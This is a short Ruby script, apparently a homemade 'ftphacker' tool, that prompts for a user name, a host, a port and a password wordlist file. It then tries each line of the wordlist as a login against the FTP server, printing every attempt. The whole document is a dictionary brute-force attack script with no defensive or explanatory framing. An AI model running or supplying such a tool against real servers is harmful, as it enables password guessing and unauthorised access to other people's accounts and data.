require './ftphacker'


puts "Please enter a user name?"
user_name = gets.chomp.to_s


puts "Please enter a host: "
ip_address = gets.chomp.to_s

puts "Please enter a port: "
port = gets.chomp.to_i

puts "\n"

puts "USER NAME: #{user_name}"
puts "IP ADDRESS: #{ip_address}"
puts "PORT: #{port}"
puts "\n"


puts "Please enter a text file: "
password = gets.chomp.to_s

File.open(password).each do |line|
  ftp=Net::FTP.new
  ftp.connect(ip_address, port)
  puts "Trying Username: #{user_name} Password: #{line}"
  ftp.login(user_name,line)
   
end